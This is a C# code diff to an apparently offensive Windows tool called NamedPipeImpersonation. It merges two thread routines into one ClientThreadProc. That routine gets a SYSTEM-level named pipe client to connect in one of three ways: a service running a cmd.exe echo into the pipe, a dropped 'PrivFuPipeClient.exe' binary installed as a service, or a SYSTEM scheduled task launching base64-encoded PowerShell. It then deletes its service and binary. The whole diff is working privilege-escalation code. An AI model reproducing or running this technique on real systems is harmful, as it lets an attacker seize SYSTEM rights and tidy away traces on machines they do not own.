@@ -90,16 +90,11 @@ namespace NamedPipeImpersonation.Library
                     using (var pipeReader = new StreamReader(pipeServer))
                     using (var hPipe = pipeServer.SafePipeHandle)
                     {
-                        Thread backgroundThread;
-
-                        if (Globals.MethodId < 2)
-                            backgroundThread = new Thread(new ThreadStart(ServiceThreadProc));
-                        else
-                            backgroundThread = new Thread(new ThreadStart(TaskThreadProc));
+                        var clientThread = new Thread(new ThreadStart(ClientThreadProc));
 
                         Console.WriteLine("[*] Waiting for client connection...");
 
-                        backgroundThread.Start();
+                        clientThread.Start();
                         pipeServer.WaitForConnection();
                         pipeMessage = pipeReader.ReadToEnd();
                         NativeMethods.NtSetEvent(Globals.ConnectionEvent, out int _);
@@ -214,11 +209,14 @@ namespace NamedPipeImpersonation.Library
         }
 
 
-        private static void ServiceThreadProc()
+        private static void ClientThreadProc()
         {
             NTSTATUS ntstatus;
-            IntPtr hService;
+            bool bSuccess;
+            IntPtr hService = IntPtr.Zero;
             var timeout = LARGE_INTEGER.FromInt64(-(Globals.Timeout * 10000));
+            var bUseService = (Globals.MethodId == PipeClientMethodType.CmdService) ||
+                (Globals.MethodId == PipeClientMethodType.Dropper);
 
             for (int i = 0; i < 10000; i++)
             {
@@ -235,114 +233,71 @@ namespace NamedPipeImpersonation.Library
                     break;
             }
 
-            Console.WriteLine("[*] Trying to create and start named pipe client service.");
-            Console.WriteLine("    [*] Service Name : {0}", Globals.ServiceName);
-
-            hService = Utilities.StartNamedPipeClientService();
-
-            if (hService == IntPtr.Zero)
+            if (bUseService)
             {
-                Console.WriteLine("[-] Failed to start named pipe client service.");
-                Console.WriteLine("    [*] {0}", Helpers.GetWin32ErrorMessage(Marshal.GetLastWin32Error(), false));
-            }
-            else
-            {
-                Console.WriteLine("[+] Named pipe client service is started successfully.");
+                string binpath;
 
-                if (Globals.MethodId == 1)
-                    Console.WriteLine("[*] Service binary @ {0}", Globals.BinaryPath);
-            }
-
-            ntstatus = NativeMethods.NtWaitForSingleObject(Globals.ConnectionEvent, false, in timeout);
-
-            if (ntstatus == Win32Consts.STATUS_TIMEOUT)
-            {
-                try
+                if (Globals.MethodId == PipeClientMethodType.CmdService)
                 {
-                    using (var pipeClient = new NamedPipeClientStream(".", Globals.ServiceName, PipeDirection.Out))
-                    {
-                        var message = Encoding.ASCII.GetBytes("timeout");
-                        pipeClient.Connect(3000);
-                        pipeClient.Write(message, 0, message.Length);
-                    }
+                    binpath = string.Format(
+                        @"{0} /c echo {1} > \\localhost\pipe\{1}",
+                        Environment.GetEnvironmentVariable("COMSPEC"),
+                        Globals.ServiceName);
                 }
-                catch { }
-            }
-
-            if (hService != IntPtr.Zero)
-            {
-                Console.WriteLine("[*] Deleting named pipe client service.");
-
-                if (!NativeMethods.DeleteService(hService))
+                else
                 {
-                    Console.WriteLine("[-] Failed to delete named pipe client servce (Service Name = {0}).", Globals.ServiceName);
+                    try
+                    {
+                        Globals.BinaryPath = string.Format(@"{0}\PrivFuPipeClient.exe", Path.GetTempPath().TrimEnd('\\'));
+                        File.WriteAllBytes(Globals.BinaryPath, Globals.BinaryData);
+                    }
+                    catch
+                    {
+                        Console.WriteLine("[!] Failed to create service binary.");
+                    }
+
+                    binpath = string.Format(@"{0} {1}", Globals.BinaryPath, Globals.ServiceName);
+                }
+
+                Console.WriteLine("[*] Trying to create and start named pipe client service.");
+                Console.WriteLine("    [*] Service Name : {0}", Globals.ServiceName);
+                Console.WriteLine("    [*] Binary Path  : {0}", binpath);
+
+                hService = Utilities.StartNamedPipeClientService(binpath);
+
+                if (hService == IntPtr.Zero)
+                {
+                    Console.WriteLine("[-] Failed to start named pipe client service.");
                     Console.WriteLine("    [*] {0}", Helpers.GetWin32ErrorMessage(Marshal.GetLastWin32Error(), false));
                 }
                 else
                 {
-                    Console.WriteLine("[+] Named pipe client service is deleted successfully.");
+                    Console.WriteLine("[+] Named pipe client service is started successfully.");
                 }
             }
-
-            try
+            else if (Globals.MethodId == PipeClientMethodType.ScheduledTask)
             {
-                if ((Globals.MethodId == 1) && File.Exists(Globals.BinaryPath))
-                {
-                    Console.WriteLine("[*] Deleting service binary.");
-                    File.Delete(Globals.BinaryPath);
-                    Console.WriteLine("[+] Service binary is deleted successfully.");
-                }
+                var poshCode = string.Format(Globals.PoshTemplate, Globals.ServiceName);
+                var args = string.Format("-EncodedCommand {0}",
+                    Convert.ToBase64String(Encoding.Unicode.GetBytes(poshCode)));
+                var binpath = "powershell.exe";
+
+                Console.WriteLine("[*] Trying to create and start a SYSTEM task.");
+                Console.WriteLine("    [*] Task Name  : {0}", Globals.ServiceName);
+                Console.WriteLine("    [*] Executable : {0}", binpath);
+                Console.WriteLine("    [*] Arguments  : {0}", args);
+
+                bSuccess = Utilities.CreateSystemExecTask(
+                    Globals.ServiceName,
+                    binpath,
+                    args,
+                    out Exception exception);
+
+                if (bSuccess)
+                    Console.WriteLine("[+] SYSTEM task is created, run and deleted successfully.");
+                else
+                    Console.WriteLine("[-] Failed to create SYSTEM task: {0}", exception.Message);
             }
-            catch
-            {
-                Console.WriteLine("[!] Failed to delete dropper binary. Delete it mannually.");
-                Console.WriteLine("    [*] Binary Path : {0}", Globals.BinaryPath);
-            }
-
-            NativeMethods.NtSetEvent(Globals.ThreadCompletionEvent, out int _);
-        }
-
-
-        private static void TaskThreadProc()
-        {
-            NTSTATUS ntstatus;
-            bool bSuccess;
-            var timeout = LARGE_INTEGER.FromInt64(-(Globals.Timeout * 10000));
-            var poshCode = string.Format(Globals.PoshTemplate, Globals.ServiceName);
-            var args = string.Format("-EncodedCommand {0}",
-                Convert.ToBase64String(Encoding.Unicode.GetBytes(poshCode)));
-            var binpath = "powershell.exe";
-
-            for (int i = 0; i < 10000; i++)
-            {
-                foreach (var f in System.IO.Directory.EnumerateFiles(@"\\.\pipe"))
-                {
-                    if (string.Compare(System.IO.Path.GetFileName(f), Globals.ServiceName, true) == 0)
-                    {
-                        Globals.PipeFound = true;
-                        break;
-                    }
-                }
-
-                if (Globals.PipeFound)
-                    break;
-            }
-
-            Console.WriteLine("[*] Trying to create and start a SYSTEM task.");
-            Console.WriteLine("    [*] Task Name  : {0}", Globals.ServiceName);
-            Console.WriteLine("    [*] Executable : {0}", binpath);
-            Console.WriteLine("    [*] Arguments  : {0}", args);
-
-            bSuccess = Utilities.CreateSystemExecTask(
-                Globals.ServiceName,
-                binpath,
-                args,
-                out Exception exception);
-
-            if (bSuccess)
-                Console.WriteLine("[+] SYSTEM task is created, run and deleted successfully.");
-            else
-                Console.WriteLine("[-] Failed to create SYSTEM task: {0}", exception.Message);
 
             ntstatus = NativeMethods.NtWaitForSingleObject(Globals.ConnectionEvent, false, in timeout);
 
@@ -358,6 +313,39 @@ namespace NamedPipeImpersonation.Library
                     }
                 }
                 catch { }
+            }
+
+            if (bUseService)
+            {
+                if (hService != IntPtr.Zero)
+                {
+                    Console.WriteLine("[*] Deleting named pipe client service.");
+
+                    if (!NativeMethods.DeleteService(hService))
+                    {
+                        Console.WriteLine("[-] Failed to delete named pipe client servce (Service Name = {0}).", Globals.ServiceName);
+                        Console.WriteLine("    [*] {0}", Helpers.GetWin32ErrorMessage(Marshal.GetLastWin32Error(), false));
+                    }
+                    else
+                    {
+                        Console.WriteLine("[+] Named pipe client service is deleted successfully.");
+                    }
+                }
+
+                try
+                {
+                    if (File.Exists(Globals.BinaryPath))
+                    {
+                        Console.WriteLine("[*] Deleting service binary.");
+                        File.Delete(Globals.BinaryPath);
+                        Console.WriteLine("[+] Service binary is deleted successfully.");
+                    }
+                }
+                catch
+                {
+                    Console.WriteLine("[!] Failed to delete dropper binary. Delete it mannually.");
+                    Console.WriteLine("    [*] Binary Path : {0}", Globals.BinaryPath);
+                }
             }
 
             NativeMethods.NtSetEvent(Globals.ThreadCompletionEvent, out int _);
